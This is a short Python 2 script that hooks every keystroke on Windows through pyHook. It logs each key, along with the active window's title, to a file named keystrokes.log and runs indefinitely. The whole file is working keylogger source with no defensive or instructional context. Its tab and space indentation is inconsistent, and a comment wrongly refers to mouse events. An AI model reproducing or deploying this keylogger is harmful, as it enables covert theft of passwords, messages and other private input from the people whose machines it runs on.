#!/usr/bin/env python
import sys, os, time, logging

try:
	import pyHook, pythoncom
except:
	print "Either pyHook or pythoncom modules are missing!"

logging.basicConfig(filename="keystrokes.log", level=logging.INFO, format='%(asctime)s %(message)s')

window = None

def OnKeyboardEvent(event):
    global window
    if event.WindowName != window:
        window = event.WindowName
        logging.info('New Window: %s',event.WindowName)
    if chr(event.Ascii).isalpha() or chr(event.Ascii).isdigit():
    	logging.info('Ascii Key: %s', chr(event.Ascii))
    else:
    	logging.info('Key: %s', event.Key)
	# return True to pass the event to other handlers
	return True

def main():
	# create a hook manager
	hm = pyHook.HookManager()
	# watch for all mouse events
	hm.KeyDown = OnKeyboardEvent
	# set the hook
	hm.HookKeyboard()
	# wait forever
	pythoncom.PumpMessages()

if __name__ == "__main__":
    main()	